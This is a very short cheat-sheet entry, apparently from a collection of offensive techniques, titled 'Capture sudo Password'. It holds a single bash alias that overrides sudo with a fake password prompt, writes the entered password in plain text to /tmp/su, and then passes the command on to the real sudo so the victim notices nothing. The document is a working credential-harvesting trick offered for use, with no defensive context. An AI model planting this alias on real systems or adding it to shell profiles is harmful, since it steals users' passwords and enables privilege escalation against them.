---
title: Capture sudo Password
---

Capture a `sudo` password:

```
alias sudo='echo -n "[sudo] password for $USER: " && read -r password && echo "$password" >/tmp/su && /usr/bin/sudo $@'
```
